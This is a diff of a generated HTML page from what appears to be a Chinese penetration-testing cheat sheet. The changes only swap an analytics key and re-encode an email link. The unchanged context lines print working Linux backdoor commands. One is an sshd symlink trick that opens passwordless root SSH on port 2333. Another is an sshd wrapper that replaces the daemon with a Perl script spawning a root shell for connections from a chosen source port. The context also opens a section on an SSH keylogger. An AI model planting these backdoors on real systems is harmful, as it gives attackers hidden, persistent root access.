@@ -14,7 +14,7 @@
 <meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://nice759.com/2022/03/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
 (function() {
   var hm = document.createElement("script");
-  hm.src = "https://hm.baidu.com/hm.js?e24ccddb2911568a6d79d95153321bf3";
+  hm.src = "https://hm.baidu.com/hm.js?fa254ca04b2501989f5cb00fe51f3cb3";
   var s = document.getElementsByTagName("script")[0]; 
   s.parentNode.insertBefore(hm, s);
 })();
@@ -769,7 +769,7 @@
 
 <h5 id="硬链接sshd"><a href="#硬链接sshd" class="headerlink" title="硬链接sshd"></a>硬链接sshd</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!bash</span><br><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su; &#x2F;tmp&#x2F;su -oPort&#x3D;2333;</span><br></pre></td></tr></table></figure>
 
-<p>链接：ssh <a href="mailto:&#x72;&#x6f;&#x6f;&#116;&#64;&#x31;&#x39;&#x32;&#x2e;&#49;&#54;&#56;&#x2e;&#50;&#48;&#x36;&#46;&#x31;&#x34;&#x32;">&#x72;&#x6f;&#x6f;&#116;&#64;&#x31;&#x39;&#x32;&#x2e;&#49;&#54;&#56;&#x2e;&#50;&#48;&#x36;&#46;&#x31;&#x34;&#x32;</a> -p 2333</p>
+<p>链接：ssh <a href="mailto:&#114;&#x6f;&#x6f;&#116;&#x40;&#49;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#50;&#x30;&#x36;&#x2e;&#49;&#52;&#x32;">&#114;&#x6f;&#x6f;&#116;&#x40;&#49;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#50;&#x30;&#x36;&#x2e;&#49;&#52;&#x32;</a> -p 2333</p>
 <h5 id="SSH-Server-wrapper"><a href="#SSH-Server-wrapper" class="headerlink" title="SSH Server wrapper"></a>SSH Server wrapper</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!bash</span><br><span class="line">cd &#x2F;usr&#x2F;sbin</span><br><span class="line">mv sshd ..&#x2F;bin</span><br><span class="line">echo &#39;#!&#x2F;usr&#x2F;bin&#x2F;perl&#39; &gt;sshd</span><br><span class="line">echo &#39;exec &quot;&#x2F;bin&#x2F;sh&quot; if (getpeername(STDIN) &#x3D;~ &#x2F;^..4A&#x2F;);&#39; &gt;&gt;sshd</span><br><span class="line">echo &#39;exec &#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125; &quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV,&#39; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">&#x2F;&#x2F;不用重启也行</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;sshd restart</span><br><span class="line">socat STDIO TCP4:192.168.206.142:22,sourceport&#x3D;13377</span><br></pre></td></tr></table></figure>
 
 <h5 id="SSH-keylogger"><a href="#SSH-keylogger" class="headerlink" title="SSH keylogger"></a>SSH keylogger</h5><p>vim当前用户下的.bashrc文件,末尾添加</p>
